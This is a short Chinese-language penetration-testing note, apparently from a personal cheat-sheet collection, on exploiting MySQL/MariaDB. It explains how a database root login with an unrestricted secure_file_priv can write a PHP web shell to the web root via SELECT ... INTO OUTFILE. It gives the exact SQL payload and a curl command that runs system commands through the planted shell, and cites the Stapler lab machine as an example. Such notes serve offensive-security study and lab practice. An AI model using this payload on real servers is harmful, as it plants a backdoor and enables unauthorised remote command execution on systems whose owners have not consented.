# MySQL 資料庫安全漏洞利用 (mysql)
本文件整理針對 MySQL / MariaDB 資料庫的漏洞利用與寫檔手法。

## 💥 INTO OUTFILE 寫入 Web Shell
在取得資料庫高權限連線（如 `root`），且目標系統允許檔案寫入、且知道 Web 根目錄絕對路徑的情境下，可直接將 PHP Web Shell 寫入伺服器目錄中。

*   **前提條件**：
    1.  MySQL 的 `secure_file_priv` 未設限（即為空值 `""`，可用 `SHOW VARIABLES LIKE "secure_file_priv";` 查詢）。
    2.  資料庫使用者具備檔案寫入權限。
    3.  Web 上傳或根目錄具備 OS 層級的可寫權限（Writable）。

*   **利用指令**：
    在 MySQL 終端中執行：
    ```sql
    select '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
    ```
    寫入後，可透過瀏覽器或 `curl` 直接呼叫該 Shell：
    ```bash
    curl 'http://<target-ip>/shell.php?cmd=whoami'
    ```

---

# 實戰關聯
*   **靶機應用實例**：[[Stapler]]（取得 WordPress 的 MySQL root 密碼後，利用 `INTO OUTFILE` 將 Shell 寫入 `/var/www/https/blogblog/wp-content/uploads/` 目錄中取得初始存取）。
